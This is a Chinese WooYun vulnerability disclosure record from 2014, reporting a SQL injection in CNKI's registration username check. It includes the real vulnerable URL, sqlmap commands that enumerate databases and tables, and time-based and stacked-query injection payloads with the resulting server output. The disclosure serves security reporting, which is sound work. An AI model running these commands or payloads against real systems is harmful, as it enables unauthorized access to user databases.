{"id": 3343, "wybug_id": "wooyun-2014-060198", "wybug_title": "中国知网主站存在SQL注射漏洞", "wybug_corp": "中国知网", "wybug_author": "超威蓝猫", "wybug_date": "2014-05-10 22:02", "wybug_open_date": "2014-06-24 22:03", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-06-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国知网主站SQL注射 详细说明：  \nhttp://www.cnki.com.cn/http://www.cnki.net/\n这两个站点的\"登录\"与\"注册\"都为相同的页面，所以可以判定为主站数据库。检测用户名是否可用的这条HTTP请求的username参数存在SQL注射。\n\n   漏洞证明：  \nsqlmap.py -u \"http://my.cnki.net/elibregister/CheckInfoUnitName.aspx?username=crtest&temp=1399707691804\" --dbs --current-user --current-db\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: username    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=crtest'; WAITFOR DELAY '0:0:5'--&temp=1399707691804    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=crtest' WAITFOR DELAY '0:0:5'--&temp=1399707691804---web server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008current user:    'loginuser'current database:    'CNKILoginDB'available databases [5]:[*] CNKILoginDB[*] master[*] model[*] msdb[*] tempdb\n\nsqlmap.py -u \"http://my.cnki.net/elibregister/CheckInfoUnitName.aspx?username=crtest&temp=1399707691804\" --tables -D CNKILoginDB\ntime-based跑表很慢，这里只读了几个做证明\n\n   修复方案：  :)   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-05-11 01:19 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  火钳流明。mark看看。。@超威蓝猫  希望细节。    \n     2014-06-10 17:27 |    \t\t止刃 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | www.qiuzhufu.com    ฏ๎๎๎๎๎๎๎๎๎...)\t\t \n  1个月了。    \n     2014-06-24 22:39 |    \t\treality0ne \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:7        )\t\t \n  这。。。。知网。。。联系不到。。    \n     2014-06-25 00:56 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  知网。。。你的裤子还好吗？    \n     2014-08-12 17:16 |    \t\t狮子找女友 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | life in security)\t\t \n  404 error    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}